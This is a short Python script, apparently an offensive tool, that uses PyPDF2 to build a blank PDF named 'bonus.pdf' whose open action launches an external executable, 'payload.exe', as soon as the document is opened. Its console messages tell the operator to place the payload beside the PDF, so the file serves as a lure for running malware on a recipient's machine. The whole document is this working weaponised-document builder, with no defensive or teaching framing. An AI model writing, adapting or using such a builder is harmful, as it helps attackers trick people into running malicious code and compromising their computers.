import PyPDF2
from PyPDF2.generic import DictionaryObject, NameObject, createStringObject, ArrayObject

def create_work_pdf(payload_name, output_pdf):
    writer = PyPDF2.PdfWriter()

    # Create a simple blank page
    writer.add_blank_page(width=612, height=792)

    # Construct /Launch action
    launch_action = DictionaryObject()
    launch_action.update({
        NameObject('/S'): NameObject('/Launch'),
        NameObject('/F'): createStringObject(payload_name),
        NameObject('/NewWindow'): NameObject('/True')
    })

    # Add an OpenAction to the PDF
    writer._root_object.update({
        NameObject('/OpenAction'): launch_action
    })

    # Write to file
    with open(output_pdf, 'wb') as f:
        writer.write(f)

    print(f"[+] Work PDF created: {output_pdf}")
    print(f"[!] Ensure '{payload_name}' is embedded next to the PDF or manually embedded.")

# Example usage
create_work_pdf('payload.exe', 'bonus.pdf')